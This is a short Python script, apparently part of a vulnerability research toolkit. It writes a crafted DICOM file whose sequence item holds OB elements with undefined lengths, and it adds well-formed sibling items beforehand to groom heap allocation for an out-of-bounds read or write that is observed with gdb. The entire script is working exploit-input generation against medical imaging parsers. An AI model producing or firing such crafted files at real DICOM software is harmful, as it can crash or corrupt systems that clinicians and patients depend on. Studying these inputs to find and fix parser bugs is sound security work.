#!/usr/bin/env python3
"""Add well-formed sibling items BEFORE the crafted item inside the same SQ.

W4/W5 groomed DICOM values outside and inside the crafted item; this varies
allocation churn from earlier items in the same sequence. Usage:

  python3 tools/make-preceding-item-variant.py OUT N PLEN [VR]

N = number of preceding items, PLEN = OB elements per preceding item, VR
defaults to OB. The crafted item is byte-identical to make-undef-ob-dos.py
with final tag 0x4841434b. Observe the OOB slot with tools/oob-word.gdb.
"""
import os
import struct
import sys

OUT = sys.argv[1]
N = int(sys.argv[2])
PLEN = int(sys.argv[3])
VR = sys.argv[4] if len(sys.argv) > 4 else "OB"


def ex(g, e, vr, value):
    head = struct.pack("<HH", g, e) + vr.encode("ascii")
    if vr in ("OB", "OW", "OF", "SQ", "UN", "UT", "OD", "OL", "OV", "UC", "UR", "SV", "UV"):
        return head + b"\x00\x00" + struct.pack("<I", len(value)) + value
    return head + struct.pack("<H", len(value)) + value


def us(e, v):
    return ex(0x0008, e, "US", struct.pack("<H", v))


def bad_ob(e):
    return struct.pack("<HH", 0x0008, e) + b"OB\x00\x00" + b"\xff\xff\xff\xff"


def item(payload):
    return struct.pack("<HHI", 0xFFFE, 0xE000, len(payload)) + payload


def main():
    # An 8-byte, 0x4a-filled value is valid for OB and for most stringVRs;
    # keep the default OB so the preceding elements parse successfully.
    pred = item(b"".join(ex(0x0008, 0x100 + i, VR, b"\x4a" * 8)
                         for i in range(PLEN)) +
                struct.pack("<HHI", 0xFFFE, 0xE00D, 0))
    final = ex(0x4841, 0x434b, "US", struct.pack("<H", 0x108))
    payload = b"".join([
        us(1, 0x101), us(2, 0x102), us(3, 0x103), us(4, 0x104),
        bad_ob(3), us(5, 0x105), bad_ob(5), us(6, 0x106), us(7, 0x107),
        final, struct.pack("<HHI", 0xFFFE, 0xE00D, 0),
    ])
    body = ex(0x0008, 0x1110, "SQ",
              pred * N + item(payload) + struct.pack("<HHI", 0xFFFE, 0xE0DD, 0))
    data = b"\x00" * 128 + b"DICM" + body
    os.makedirs(os.path.dirname(OUT) or ".", exist_ok=True)
    with open(OUT, "wb") as f:
        f.write(data)
    print("wrote %s (%d bytes)" % (OUT, len(data)))


if __name__ == "__main__":
    main()
